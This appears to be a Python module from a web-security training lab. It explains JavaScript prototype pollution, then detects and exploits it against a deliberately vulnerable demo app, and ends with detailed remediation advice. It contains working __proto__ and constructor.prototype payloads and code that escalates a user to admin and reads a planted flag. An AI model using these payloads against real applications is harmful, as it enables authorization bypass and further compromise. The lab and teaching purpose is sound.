"""JavaScript Prototype Pollution -- detect, exploit, and remediate.

WHAT IT IS
----------
Prototype pollution is a class of injection unique to prototype-based languages
(JavaScript, and by extension Node.js back ends). Every JS object inherits from a
shared prototype object reachable through the ``__proto__`` accessor (or
``constructor.prototype``). When an application *recursively merges* untrusted,
attacker-controlled data into a server-side object WITHOUT filtering those magic
keys, the attacker can walk past the target object and write onto the SHARED
prototype itself. Because every other object inherits from that prototype, a
single polluting write silently grants new properties to objects the attacker
never touched -- including security-relevant flags like ``isAdmin``. The demo
app's recursive merge is the textbook sink (``weblab/targetapp/advanced_routes.py``)::

    def _merge(target, src, proto):
        for key, value in src.items():
            if key in ("__proto__", "constructor", "prototype"):
                _merge(proto, value, proto)   # <-- writes the SHARED prototype
                continue
            ...
            target[key] = value

and the privilege check that the pollution subverts reads through the prototype::

    is_admin = prof.get("isAdmin", proto.get("isAdmin", False))  # inherited!

A normal merge of ``{"name": "alice"}`` only touches the profile. But a merge of
``{"__proto__": {"isAdmin": true}}`` follows the special key into ``proto`` and
sets ``isAdmin`` on the shared prototype -- so the very next profile read inherits
``isAdmin = true`` and the server promotes the user to ``admin`` and discloses the
planted flag. (The lab models the JS runtime faithfully in Python: ``state.proto``
is the stand-in for ``Object.prototype``; the real-world runtime is Node.js with
libraries like a vulnerable ``lodash.merge`` / ``deepmerge`` / ``$.extend(true,...)``.)

HOW WE DISCOVER IT
------------------
We confirm the flaw with a differential, before/after signal:

1. **Baseline read.** ``GET /api/profile`` returns ``{"role": "user"}`` and carries
   NO flag -- the un-privileged starting state. This is the control: any
   "admin" we observe later must be something WE caused.
2. **The polluting merge.** ``POST /api/profile/merge`` with the JSON body
   ``{"__proto__": {"isAdmin": true}}`` (we also carry the equivalent
   ``{"constructor": {"prototype": {"isAdmin": true}}}`` variant). The endpoint
   answers ``{"status": "merged"}`` -- no error, the write landed.
3. **The privilege flip.** ``GET /api/profile`` now returns ``{"role": "admin"}``.
   The role transitioned user -> admin even though we never sent an ``isAdmin``
   key on the profile itself -- proof the value was inherited through the polluted
   prototype. That role flip IS the detection.

HOW WE EXPLOIT IT
-----------------
The same polluted read returns the planted prize alongside the elevated role::

    {"name": "alice", "role": "admin", "flag": C.FLAGS["prototype_pollution"]}

We recover ``C.FLAGS["prototype_pollution"]`` directly from that response. In the
real world the impact is far broader than one flag: polluting ``isAdmin`` /
``isAuthenticated`` bypasses authorization, polluting properties consumed by
``child_process`` / template engines / SQL builders escalates to RCE, SQLi, or
XSS, and polluting config defaults causes denial-of-service.

THE FIX
-------
See :data:`REMEDIATION`. In one line: reject the magic keys (``__proto__``,
``constructor``, ``prototype``) in any recursive merge, prefer ``Object.create(null)``
/ ``Map`` for untrusted dictionaries, freeze ``Object.prototype``, and validate
input against a strict schema so attacker keys never reach the merge at all.
"""
from __future__ import annotations

from typing import Any, Dict, List, Optional, Tuple

from ._types import Finding, Response, Severity
from .http_client import WebClient
from .targetapp import constants as C

REMEDIATION: str = (
    "Prototype pollution is caused by recursively merging untrusted input into an "
    "object without rejecting the prototype-walking keys. Fix it at the merge: "
    "explicitly skip the dangerous keys '__proto__', 'constructor', and 'prototype' "
    "(and reject any key resolving to them) before assigning, so attacker data can "
    "never escape the target object onto the shared prototype. Better, do not merge "
    "untrusted data into prototype-bearing objects at all: store user-controlled "
    "dictionaries in a null-prototype object (Object.create(null)) or a Map, which "
    "have no __proto__ accessor to abuse. Validate every request body against a strict "
    "allow-list schema (e.g. JSON Schema with additionalProperties:false) so unexpected "
    "keys are rejected before they reach any merge or assignment. Harden the runtime "
    "with Object.freeze(Object.prototype) and run Node with --disable-proto=delete (or "
    "=throw) so prototype writes fail loudly. Audit and pin merge utilities -- many "
    "older versions of lodash.merge/defaultsDeep, jQuery $.extend(true, ...), and "
    "deepmerge were vulnerable; upgrade to patched releases. Finally, derive authorization "
    "decisions from server-side identity/session state, never from a property an inbound "
    "merge could ever set (an inherited 'isAdmin' must never grant admin). Reject the "
    "magic keys, isolate untrusted data, validate against a schema, and freeze the "
    "prototype -- defence in depth so a single polluting write cannot privilege-escalate."
)

#: The profile read surface (baseline + the polluted flag read).
PROFILE_ENDPOINT: str = "/api/profile"

#: The vulnerable recursive-merge sink (used as the Finding endpoint).
ENDPOINT: str = "/api/profile/merge"

#: The classic ``__proto__`` polluting payload: writes ``isAdmin`` onto the
#: shared prototype so the next profile read inherits admin.
PROTO_PAYLOAD: Dict[str, Any] = {"__proto__": {"isAdmin": True}}

#: The equivalent ``constructor.prototype`` variant -- the same pollution via a
#: second magic-key path (some filters block one and miss the other).
CONSTRUCTOR_PAYLOAD: Dict[str, Any] = {"constructor": {"prototype": {"isAdmin": True}}}

#: A benign control merge: an ordinary key that touches ONLY the profile object
#: and must NOT cause any privilege change (proves the role flip is the pollution).
BENIGN_PAYLOAD: Dict[str, Any] = {"name": "weblab-pp-probe"}

#: Every payload the engine tries (public so the CLI / report can show exactly
#: what was attempted). The two pollution variants plus the benign control.
PAYLOADS: List[Dict[str, Any]] = [PROTO_PAYLOAD, CONSTRUCTOR_PAYLOAD, BENIGN_PAYLOAD]


# --- low-level probes --------------------------------------------------------
def _profile(client: WebClient) -> Response:
    """``GET /api/profile`` -- the role/flag read surface."""
    return client.get(PROFILE_ENDPOINT)


def _merge(client: WebClient, payload: Dict[str, Any]) -> Response:
    """``POST /api/profile/merge`` with a JSON body -- the recursive-merge sink."""
    return client.post(ENDPOINT, json=payload)


def _role(resp: Response) -> Optional[str]:
    """Extract the ``role`` field from a profile response, or ``None``."""
    try:
        body = resp.json()
    except Exception:  # noqa: BLE001 - non-JSON body -> no role
        return None
    return body.get("role") if isinstance(body, dict) else None


# --- detection ---------------------------------------------------------------
def detect_baseline_is_user(client: WebClient) -> Tuple[bool, str]:
    """True if the un-polluted profile reads ``role=user`` (the control state).

    ``GET /api/profile`` must return the un-privileged ``user`` role and carry no
    flag. This anchors the detection: any later ``admin`` we observe is something
    the pollution caused, not a pre-existing condition.
    """
    resp = _profile(client)
    role = _role(resp)
    if resp.status == 200 and role == "user" and C.FLAGS["prototype_pollution"] not in resp.text:
        return True, (
            f"GET {PROFILE_ENDPOINT} returned role={role!r} (HTTP {resp.status}) "
            "with no flag -- the un-privileged baseline"
        )
    return False, ""


def detect_pollution(
    client: WebClient, payload: Dict[str, Any] = PROTO_PAYLOAD
) -> Tuple[bool, str]:
    """True if a polluting merge flips the profile role from user to admin.

    Sends ``payload`` (default ``{"__proto__": {"isAdmin": true}}``) to the merge
    sink, then re-reads the profile. The role transitioning user -> admin -- even
    though we never set ``isAdmin`` on the profile object itself -- proves the
    value was inherited through the polluted shared prototype. That flip is the
    detection.
    """
    merge_resp = _merge(client, payload)
    if merge_resp.status != 200:
        return False, ""
    after = _profile(client)
    role = _role(after)
    if after.status == 200 and role == "admin":
        return True, (
            f"POST {ENDPOINT} {payload!r} -> {{'status':'merged'}}; "
            f"GET {PROFILE_ENDPOINT} then returned role={role!r} -- the role flipped "
            "user->admin via an inherited isAdmin, confirming prototype pollution"
        )
    return False, ""


# --- exploitation ------------------------------------------------------------
def exploit_pollute_and_read_flag(
    client: WebClient, payload: Dict[str, Any] = PROTO_PAYLOAD
) -> Tuple[bool, Optional[str], Dict[str, Any]]:
    """Pollute the prototype, then read the admin profile to recover the flag.

    Returns ``(ok, flag, profile_body)``. On success the polluted profile read
    returns ``{"role": "admin", "flag": C.FLAGS["prototype_pollution"], ...}`` and
    we recover the planted flag directly from it.
    """
    _merge(client, payload)
    resp = _profile(client)
    try:
        body = resp.json()
    except Exception:  # noqa: BLE001
        return False, None, {}
    if not isinstance(body, dict):
        return False, None, {}
    flag = body.get("flag")
    if resp.status == 200 and flag == C.FLAGS["prototype_pollution"]:
        return True, flag, body
    return False, None, body


# --- the contract entry point ------------------------------------------------
def assess(client: WebClient) -> Finding:
    """Detect JS prototype pollution, then exploit it (pollute -> read the flag).

    Returns a :class:`Finding` whose ``exploit_result`` contains the recovered
    ``C.FLAGS["prototype_pollution"]``. Detection is the role flip user->admin
    after an unfiltered ``__proto__`` merge; exploitation reads the planted flag
    out of the now-elevated profile.
    """
    techniques: List[str] = []

    # 1) Detection ----------------------------------------------------------
    # Baseline first (on a fresh client this is the un-polluted state).
    baseline_ok, baseline_ev = detect_baseline_is_user(client)
    if baseline_ok:
        techniques.append("baseline-user")

    # The __proto__ pollution flips role -> admin.
    proto_ok, proto_ev = detect_pollution(client, PROTO_PAYLOAD)
    if proto_ok:
        techniques.append("proto-pollution")

    # 2) Exploitation -------------------------------------------------------
    ok, flag, profile_body = exploit_pollute_and_read_flag(client, PROTO_PAYLOAD)
    if ok:
        techniques.append("read-admin-flag")

    # The constructor.prototype variant: confirm the second magic-key path also
    # pollutes (the prototype is already polluted, so this corroborates the
    # alternative payload reaches the same sink). Best-effort, never fatal.
    constructor_ok = False
    constructor_resp = _merge(client, CONSTRUCTOR_PAYLOAD)
    if constructor_resp.status == 200:
        constructor_ok = _role(_profile(client)) == "admin"
        if constructor_ok:
            techniques.append("constructor-pollution")

    # Discovery requires the role to have flipped to admin AND the flag recovered.
    discovered = bool(proto_ok and ok)

    # 3) Assemble evidence / result ----------------------------------------
    evidence_parts: List[str] = []
    if baseline_ok:
        evidence_parts.append(f"baseline: {baseline_ev}")
    if proto_ok:
        evidence_parts.append(f"pollution: {proto_ev}")
    evidence = " || ".join(evidence_parts)

    exploit_result = {
        "flag": flag,
        "payload": PROTO_PAYLOAD,
        "polluted_property": "isAdmin",
        "role_before": "user",
        "role_after": profile_body.get("role") if isinstance(profile_body, dict) else None,
        "profile": profile_body,
        "techniques": techniques,
        "summary": (
            f"POST {ENDPOINT} {PROTO_PAYLOAD!r} polluted the shared prototype's "
            f"isAdmin; GET {PROFILE_ENDPOINT} then returned role=admin and recovered "
            f"flag {flag!r}"
        ),
    }

    return Finding(
        vuln="JavaScript Prototype Pollution",
        endpoint=ENDPOINT,
        severity=Severity.CRITICAL.value,
        discovered=discovered,
        evidence=evidence,
        exploit_result=exploit_result,
        remediation=REMEDIATION,
        payload=str(PROTO_PAYLOAD),
        extra={
            "techniques": techniques,
            "profile_endpoint": PROFILE_ENDPOINT,
            "merge_endpoint": ENDPOINT,
            "proto_payload": PROTO_PAYLOAD,
            "constructor_payload": CONSTRUCTOR_PAYLOAD,
            "benign_payload": BENIGN_PAYLOAD,
            "baseline_user_ok": baseline_ok,
            "proto_pollution_ok": proto_ok,
            "constructor_pollution_ok": constructor_ok,
            "flag_recovered": ok,
            "polluted_property": "isAdmin",
            "role_before": "user",
            "role_after": profile_body.get("role") if isinstance(profile_body, dict) else None,
        },
    )
